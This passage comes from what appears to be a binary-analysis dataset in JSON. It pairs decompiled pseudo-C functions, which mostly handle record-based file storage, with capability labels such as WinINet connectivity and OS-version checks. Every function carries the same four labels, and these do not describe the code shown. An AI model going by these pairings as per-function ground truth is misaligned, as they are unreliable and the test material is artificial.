code_r0x000210fa;\n            }\n        }\n    }\n    if (*arg_10h == 0xffffffff) {\n        var_8h = -1;\n    }\n    else {\n        var_120h = fcn.00035200(0x6c);\n        if (var_120h == NULL) {\n            var_8h = -1;\n        }\n        else {\n            fcn.00078790(var_120h, 0, 0x6c);\n            var_120h[0x10] = arg_8h_00;\n            var_120h[0x11] = arg_14h;\n            uVar4 = (**(var_120h[0x11] + 4))(arg_8h, 0);\n            var_120h[0x12] = uVar4;\n            if (var_120h[0x12] == 0) {\n                var_8h = 3;\n            }\n            else {\n                var_120h[1] = 1;\n                while (iVar5 = (**(var_120h[0x11] + 0x14))(var_120h[0x12], var_120h + 2, 0x2c, 0),  iVar5 == 0) {\n                    uVar6 = (**(var_120h[0x11] + 0x10))(var_120h[0x12]);\n                    if (uVar6 == 0xffffffff) {\n                        var_8h = 3;\n                        goto code_r0x000210fa;\n                    }\n                    if (uVar6 < 0x2c) {\n                        var_8h = 3;\n                        goto code_r0x000210fa;\n                    }\n                    if (((var_120h[2] != uVar6) && (var_120h[2] = uVar6,  bVar2)) &&\n                       (iVar5 = fcn.00023aa0(var_120h, 1),  iVar5 != 0)) {\n                        var_8h = 3;\n                        goto code_r0x000210fa;\n                    }\n                    if (((0x40000000 < var_120h[3]) || (0x40000000 < var_120h[4])) ||\n                       ((var_120h[4] <= var_120h[3] && var_120h[3] != var_120h[4] ||\n                        ((0x20000000 < var_120h[5] ||\n                         (var_120h[4] <= var_120h[3] + var_120h[5] && var_120h[3] + var_120h[5] != var_120h[4])))))) {\n                        var_8h = 3;\n                        goto code_r0x000210fa;\n                    }\n                    if (bVar2) {\n                        (**(var_120h[0x11] + 0x1c))(var_120h[0x12], 2);\n                        var_8h = fcn.000228a0(var_120h);\n                        if (var_8h != 0) goto code_r0x000210fa;\n                        bVar3 = true;\n                        var_120h[9] = 1;\n                        iVar5 = fcn.00023aa0(var_120h, 0);\n                        if (iVar5 != 0) {\n                            var_8h = 3;\n                            goto code_r0x000210fa;\n                        }\n                        if (-1 < arg_ch) {\n                            fcn.000213b0(*var_120h);\n                        }\n                        var_120h[0x13] = arg_ch;\n                        if ((0 < arg_ch) && (iVar5 = fcn.00033ff0(var_120h + 0x14),  iVar5 != 0)) {\n                            fcn.0001a8e0(var_120h + 0x15, 0xb1bee1e0, var_120h);\n                        }\n                        fcn.00034550(0xb1c68740);\n                        var_4h = 1;\n                        *arg_10h = 0xffffffff;\n                        var_118h = 0;\n                        goto code_r0x000210b2;\n                    }\n                    if ((var_120h[0xc] == 0) || (var_120h[0xc] == -0x33333334)) {\n                        uVar4 = fcn.000227f0(arg_8h_00);\n                        var_120h[0xc] = uVar4;\n                        iVar5 = fcn.00023aa0(var_120h, 0);\n                        if (iVar5 != 0) {\n                            var_8h = 3;\n                            goto code_r0x000210fa;\n                        }\n                    }\n                    fcn.00078790(&var_110h, 0, 0x104);\n                    fcn.00020a20(&var_110h, 0x103, 0xb1bdea5c, 0xb1bdea20);\n                    iVar5 = fcn.000345e0(var_120h + 0x17, &var_110h);\n                    if ((iVar5 != 0) && (iVar5 = fcn.000346d0(var_120h + 0x17, &var_110h),  iVar5 != 0)) {\n                        var_8h = -1;\n                        goto code_r0x000210fa;\n                    }\n                    fcn.000345c0(0xb1c68740);\n                    var_4h = 0;\n                    fcn.000347b0(var_120h + 0x17);\n                    bVar2 = true;\n                }\n                var_8h = 3;\n            }\n        }\n    }\ncode_r0x000210fa:\n    if (var_4h != 0) {\n        fcn.000345c0(0xb1c68740);\n    }\n    if ((var_120h != NULL) && (var_120h[0x12] != 0)) {\n        (**(var_120h[0x11] + 0x1c))(var_120h[0x12], 1);\n    }\n    if (bVar2) {\n        fcn.000347d0(var_120h + 0x17);\n    }\n    if (var_8h != 0) {\n        if (bVar3) {\n            fcn.00022bc0(var_120h);\n        }\n        if (var_120h != NULL) {\n            if (var_120h[0x12] != 0) {\n                (**(var_120h[0x11] + 8))(var_120h[0x12]);\n            }\n            if (bVar2) {\n                fcn.00034790(var_120h + 0x17);\n            }\n            fcn.00035330(var_120h);\n        }\n        fcn.00035330(arg_8h_00);\n    }\n    return var_8h;\ncode_r0x000210b2:\n    if (9 < var_118h) goto code_r0x000210f3;\n    if (*(var_118h * 4 + -0x4e3978b8) == 0) {\n        *arg_10h = var_118h;\n        *(*arg_10h * 4 + -0x4e3978b8) = var_120h;\n        var_8h = 0;\n        goto code_r0x000210fa;\n    }\n    var_118h = var_118h + 1;\n    goto code_r0x000210b2;\ncode_r0x000210f3:\n    var_8h = -1;\n    goto code_r0x000210fa;\n}\n",
        "token_count": 2708
    },
    "000211e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.000211e0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_8h != NULL) {\n        while (iVar1 = fcn.000340e0(var_4h + 0x14, 1800000),  iVar1 == 0) {\n            var_4h = *var_4h;\n            fcn.000213b0(var_4h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "00021240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00021240(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = fcn.00023940(&var_14h, arg_8h, 2, &var_10h);\n    if (var_4h == 0) {\n        var_8h = 1;\n        if ((arg_ch == 0) && (*(var_14h + 4) = *(var_14h + 4) + -1,  *(var_14h + 4) != 0)) goto code_r0x0002138e;\n        if (*(var_14h + 0x4c) != -1) {\n            fcn.000340b0(var_14h + 0x50);\n            fcn.00023a70(&var_10h);\n            fcn.00037270(var_14h + 0x54, 0);\n            fcn.00034080(var_14h + 0x50);\n            fcn.00037220(var_14h + 0x54);\n            var_4h = fcn.00023940(&var_14h, arg_8h, 2, &var_10h);\n        }\n    }\n    if (*(arg_8h * 4 + -0x4e3978b8) != 0) {\n        (**(*(*(arg_8h * 4 + -0x4e3978b8) + 0x44) + 8))(*(var_14h + 0x48));\n        fcn.00022bc0(*(arg_8h * 4 + -0x4e3978b8));\n        fcn.00035330(*(*(arg_8h * 4 + -0x4e3978b8) + 0x40));\n    }\n    if (var_4h == 0) {\n        fcn.00023a70(&var_10h);\n        var_8h = 0;\n        fcn.00034790(var_14h + 0x5c);\n    }\n    fcn.00035330(*(arg_8h * 4 + -0x4e3978b8));\n    *(arg_8h * 4 + -0x4e3978b8) = 0;\ncode_r0x0002138e:\n    var_4h = 0;\n    if (var_8h != 0) {\n        fcn.00023a70(&var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 610
    },
    "000213b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000213b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_130h;\n    int32_t var_12ch;\n    int32_t var_128h;\n    int32_t *var_124h;\n    int32_t *var_120h;\n    uint32_t var_11ch;\n    uint var_118h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_c8h;\n    int32_t var_a4h;\n    int32_t var_90h;\n    uint32_t var_8ch;\n    int32_t var_88h;\n    uint32_t var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_74h;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_38h;\n    int32_t var_14h;\n    \n    var_84h = 0;\n    var_44h = fcn.00023940(&var_90h, arg_8h, 1, &var_7ch);\n    if (var_44h != 0) {\n        return;\n    }\n    puVar2 = var_90h + 8;\n    puVar3 = &var_74h;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (*(var_90h + 0x20) == 0) {\n        var_80h = fcn.00022f50(var_90h, 0);\n        if (var_80h != *(var_90h + 8)) {\n            fcn.00022fb0(var_90h, var_80h);\n        }\n        goto code_r0x000218c7;\n    }\n    (**(*(var_90h + 0x44) + 0x1c))(*(var_90h + 0x48), 2);\n    var_8ch = 0x2c;\n    var_48h = 0;\n    do {\n        while( true ) {\n            while( true ) {\n                if (*(var_90h + 0x1c) <= var_8ch) goto code_r0x000216cf;\n                iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_d0h, 0x40, var_8ch);\n                if (iVar1 != 0) goto code_r0x000218c7;\n                var_84h = var_8ch + 0x40 + var_a4h;\n                if (var_84h <= var_8ch) goto code_r0x000216cf;\n                if (var_c8h == 0xffff) break;\n                var_8ch = var_8ch + 0x40 + var_a4h;\n                var_48h = var_48h + 1;\n            }\n            if (*(var_90h + 0x1c) <= var_84h) goto code_r0x000216cf;\n            iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_40h, 0x40, var_84h);\n            if (iVar1 != 0) goto code_r0x000218c7;\n            var_88h = var_14h + 0x40;\n            if (var_38h != 0xffff) break;\n            var_a4h = var_a4h + var_88h;\n            iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), &var_d0h, 0x40, var_8ch);\n            if (iVar1 != 0) goto code_r0x000218c7;\n        }\n        iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), &var_118h, 0x40, var_8ch);\n        if ((iVar1 != 0) || (var_d4h = fcn.00035200(var_88h),  var_d4h == 0)) goto code_r0x000218c7;\n        iVar1 = (**(*(var_90h + 0x44) + 0x14))(*(var_90h + 0x48), var_d4h, var_88h, var_84h);\n        if (iVar1 != 0) {\n            fcn.00035330(var_d4h);\n            goto code_r0x000218c7;\n        }\n        iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), var_d4h, var_88h, var_8ch);\n        if (iVar1 != 0) {\n            fcn.00035330(var_d4h);\n            goto code_r0x000218c7;\n        }\n        fcn.00035330(var_d4h);\n        iVar1 = (**(*(var_90h + 0x44) + 0x18))(*(var_90h + 0x48), &var_118h, 0x40, var_8ch + 0x40 + var_14h);\n    } while (iVar1 == 0);\ncode_r0x000216cf:\n    *(var_90h + 0x1c) = var_8ch;\n    *(var_90h + 0x18) = var_48h;\n    *(var_90h + 0x20) = 0;\n    var_120h = &var_74h;\n    var_124h = var_90h + 8;\n    for (var_11ch = 0x2c; 3 < var_11ch; var_11ch = var_11ch - 4) {\n        if (*var_124h != *var_120h) goto code_r0x00021758;\n        var_120h = var_120h + 1;\n        var_124h = var_124h + 1;\n    }\n    if (var_11ch == 0) {\ncode_r0x0002182e:\n        var_12ch = 0;\n    }\n    else {\ncode_r0x00021758:\n        var_128h = *var_124h - *var_120h;\n        if (var_128h == 0) {\n            if (var_11ch == 1) goto code_r0x0002182e;\n            var_128h = *(var_124h + 1) - *(var_120h + 1);\n            if (var_128h == 0) {\n                if (var_11ch == 2) goto code_r0x0002182e;\n                var_128h = *(var_124h + 2) - *(var_120h + 2);\n                if (var_128h == 0) {\n                    if ((var_11ch == 3) || (var_128h = *(var_124h + 3) - *(var_120h + 3),  var_128h == 0))\n                    goto code_r0x0002182e;\n                }\n            }\n        }\n        var_12ch = 1;\n        if (var_128h < 1) {\n            var_12ch = -1;\n        }\n    }\n    if ((var_12ch == 0) || (iVar1 = fcn.00023aa0(var_90h, 1),  iVar1 == 0)) {\n        fcn.000228a0(var_90h);\n        var_80h = fcn.00022f50(var_90h, 0);\n        if (var_80h != *(var_90h + 8)) {\n            fcn.00022fb0(var_90h, var_80h);\n        }\n    }\n    else {\n        fcn.00022bc0(var_90h);\n    }\ncode_r0x000218c7:\n    (**(*(var_90h + 0x44) + 0x1c))(*(var_90h + 0x48), 1);\n    fcn.00023a70(&var_7ch);\n    return;\n}\n",
        "token_count": 1942
    },
    "00021900": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021900(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint var_28h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023940(&var_10h, arg_8h, 5, &var_ch);\n    if (var_4h == 0) {\n        fcn.00023d60(var_10h, &arg_ch);\n        arg_8h_01 = *(var_10h + 0x34);\n        arg_8h_00 = fcn.00022f10(arg_8h_01, arg_ch, arg_10h);\n        var_14h = fcn.00023060(arg_8h_00, arg_8h_01);\n        if (var_14h == -1) {\n            var_4h = 5;\n        }\n        else {\n            iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n            if (iVar1 == 0) {\n                var_28h = 0;\n                iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    var_4h = 0;\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            else {\n                var_4h = 3;\n            }\n        }\n        fcn.00023a70(&var_ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 459
    },
    "000219e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000219e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint auStack76 [13];\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h < 4) {\n        var_4h = fcn.00023940(&var_10h, arg_8h, 5, &var_ch);\n        if (var_4h == 0) {\n            fcn.00023d60(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.00022f10(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.00023060(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    auStack76[arg_18h] = arg_1ch;\n                    iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                    if (iVar1 == 0) {\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = 3;\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            fcn.00023a70(&var_ch);\n        }\n    }\n    else {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 509
    },
    "00021ad0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021ad0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_ch_00;\n    uint32_t uVar1;\n    uint arg_8h_00;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023940(&var_10h, arg_8h, 1, &var_ch);\n    if (var_4h == 0) {\n        fcn.00023d60(var_10h, &arg_ch);\n        arg_8h_00 = *(var_10h + 0x34);\n        arg_ch_00 = fcn.00022f10(arg_8h_00, arg_ch, arg_10h);\n        fcn.000230f0(var_10h, arg_ch_00, arg_8h_00);\n        if ((-1 < *(var_10h + 0x4c)) &&\n           (((1 < *(var_10h + 0x20) &&\n             (*(var_10h + 0x18) <= *(var_10h + 0x20) && *(var_10h + 0x20) != *(var_10h + 0x18))) ||\n            (uVar1 = (*(var_10h + 0x10) >> 10) / 100,  uVar1 <= *(var_10h + 0x20) && *(var_10h + 0x20) != uVar1)))) {\n            fcn.000213b0(arg_8h);\n        }\n        fcn.00023a70(&var_ch);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 404
    },
    "00021b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021b80(uint arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00023940(&var_1ch, arg_8h, 1, &var_14h);\n    if (var_8h == 0) {\n        if (arg_10h == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_4h = *arg_ch;\n            fcn.00023d60(var_1ch, &var_4h);\n            var_18h = fcn.00022f10(*(var_1ch + 0x34), var_4h, arg_ch[2]);\n            for (var_ch = 0; var_ch < arg_10h; var_ch = var_ch + 1) {\n                if (arg_ch[var_ch * 0x10 + 1] != -1) {\n                    fcn.00023130(var_1ch, var_18h, arg_ch[var_ch * 0x10 + 1], 2);\n                }\n            }\n            fcn.000232d0(var_18h);\n            var_8h = fcn.00023aa0(var_1ch, 1);\n            if (var_8h == 0) {\n                if ((-1 < *(var_1ch + 0x4c)) &&\n                   (((1 < *(var_1ch + 0x20) &&\n                     (*(var_1ch + 0x18) <= *(var_1ch + 0x20) && *(var_1ch + 0x20) != *(var_1ch + 0x18))) ||\n                    (uVar1 = (*(var_1ch + 0x10) >> 10) / 100,  uVar1 <= *(var_1ch + 0x20) && *(var_1ch + 0x20) != uVar1)\n                    ))) {\n                    fcn.000213b0(arg_8h);\n                }\n                var_8h = 0;\n            }\n        }\n        fcn.00023a70(&var_14h);\n    }\n    return var_8h;\n}\n",
        "token_count": 549
    },
    "00021cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00021cb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_2ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023940(&var_14h, arg_8h, 1, &var_10h);\n    if (var_4h == 0) {\n        fcn.00023d60(var_14h, &arg_ch);\n        var_8h = fcn.00022f10(*(var_14h + 0x34), arg_ch, arg_10h);\n        if (var_8h == 0) {\n            var_4h = 5;\n        }\n        else {\n            var_18h = fcn.00023060(var_8h, arg_14h);\n            if (var_18h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_14h + 0x44) + 0x14))(*(var_14h + 0x48), &var_58h, 0x40, var_18h);\n                if (iVar1 == 0) {\n                    var_50h = arg_18h;\n                    arg_8h_00 = fcn.00022f10(*(var_14h + 0x34), arg_ch, arg_18h);\n                    iVar1 = fcn.00023360(arg_8h_00);\n                    *arg_1ch = iVar1 + 1;\n                    var_54h = *arg_1ch;\n                    iVar1 = (**(*(var_14h + 0x44) + 0x18))(*(var_14h + 0x48), &var_58h, 0x40, var_18h);\n                    if (iVar1 == 0) {\n                        fcn.00023110(var_14h, var_8h, arg_14h);\n                        fcn.00022da0(var_14h, arg_ch, arg_18h, var_54h, var_4ch, var_18h, var_2ch);\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = 3;\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n        }\n        fcn.00023a70(&var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 652
    },
    "00021e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00021e10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint32_t arg_20h, \n            uint32_t *arg_24h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    if ((arg_1ch == 0) || (arg_24h == NULL)) {\n        var_4h = 0xffffffff;\n    }\n    else {\n        var_4h = fcn.00023940(&var_10h, arg_8h, 0, &var_ch);\n        if (var_4h == 0) {\n            fcn.00023d60(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.00022f10(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.00023060(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                var_34h = fcn.00035e60(0);\n                (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (var_2ch - arg_18h < arg_20h) {\n                    var_5ch = var_2ch - arg_18h;\n                }\n                else {\n                    var_5ch = arg_20h;\n                }\n                *arg_24h = var_5ch;\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), arg_1ch, *arg_24h, var_14h + 0x40 + arg_18h);\n                var_4h = -(iVar1 != 0) & 3;\n            }\n            fcn.00023a70(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 632
    },
    "00021f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00021f40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_20h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_58h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if ((arg_1ch == 0) && (arg_20h != 0)) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023940(&var_10h, arg_8h, 5, &var_ch);\n        if (var_4h == 0) {\n            fcn.00023d60(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.00022f10(arg_8h_01, arg_ch, arg_10h);\n            var_14h = fcn.00023060(arg_8h_00, arg_8h_01);\n            if (var_14h == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                if (iVar1 == 0) {\n                    if (var_2ch < arg_18h + arg_20h) {\n                        var_4h = 6;\n                    }\n                    else {\n                        var_30h = fcn.00035e60(0);\n                        if (var_28h < arg_18h + arg_20h) {\n                            var_28h = arg_18h + arg_20h;\n                        }\n                        iVar1 = (**(*(var_10h + 0x44) + 0x18))\n                                          (*(var_10h + 0x48), arg_1ch, arg_20h, var_14h + 0x40 + arg_18h);\n                        if (iVar1 == 0) {\n                            iVar1 = (**(*(var_10h + 0x44) + 0x18))(*(var_10h + 0x48), &var_58h, 0x40, var_14h);\n                            if (iVar1 == 0) {\n                                var_4h = 0;\n                            }\n                            else {\n                                var_4h = 3;\n                            }\n                        }\n                        else {\n                            var_4h = 3;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 3;\n                }\n            }\n            fcn.00023a70(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 704
    },
    "000220a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0002214c)\n\nint32_t __cdecl\nfcn.000220a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint *arg_1ch, int32_t *arg_20h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_4h;\n    \n    if (arg_20h == NULL) {\n        return -1;\n    }\n    var_4ch = fcn.00023940(&var_58h, arg_8h, 1, &var_54h);\n    if (var_4ch != 0) {\n        return var_4ch;\n    }\n    fcn.00023d60(var_58h, &arg_ch);\n    if (*(var_58h + 0x28) != '\\0') {\n        uVar3 = fcn.00078778(*(var_58h + 0x28), 0, *(var_58h + 0x10), 0);\n        uVar1 = fcn.000234b0(var_58h, arg_ch, arg_10h);\n        uVar4 = fcn.00078778(uVar1 + arg_18h, (uVar1 >> 0x1f) + CARRY4(uVar1, arg_18h), 100, 0);\n        if (uVar3 < uVar4) {\n            var_4ch = 7;\n            goto code_r0x0002224a;\n        }\n    }\n    fcn.00078790(&var_48h, 0, 0x40);\n    var_3ch = arg_14h;\n    var_48h = arg_ch;\n    var_28h = fcn.00035e60(0);\n    var_24h = 0;\n    var_1ch = arg_18h;\n    var_40h = arg_10h;\n    var_20h = 0;\n    if (arg_1ch != NULL) {\n        var_38h = *arg_1ch;\n        var_34h = arg_1ch[1];\n        var_30h = arg_1ch[2];\n        var_2ch = arg_1ch[3];\n    }\n    uVar2 = fcn.00022f10(*(var_58h + 0x34), arg_ch, arg_10h);\n    var_44h = fcn.00023360(uVar2);\n    var_44h = var_44h + 1;\n    *arg_20h = var_44h;\n    var_4h = fcn.00023390(var_58h, &var_48h);\n    if (var_4h == -1) {\n        var_4ch = 4;\n    }\n    else {\n        var_4ch = fcn.00022da0(var_58h, arg_ch, arg_10h, *arg_20h, arg_14h, var_4h, arg_18h);\n        uVar2 = fcn.00022f10(*(var_58h + 0x34), arg_ch, arg_10h);\n        fcn.000232d0(uVar2);\n    }\ncode_r0x0002224a:\n    fcn.00023a70(&var_54h);\n    return var_4ch;\n}\n",
        "token_count": 919
    },
    "00022260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
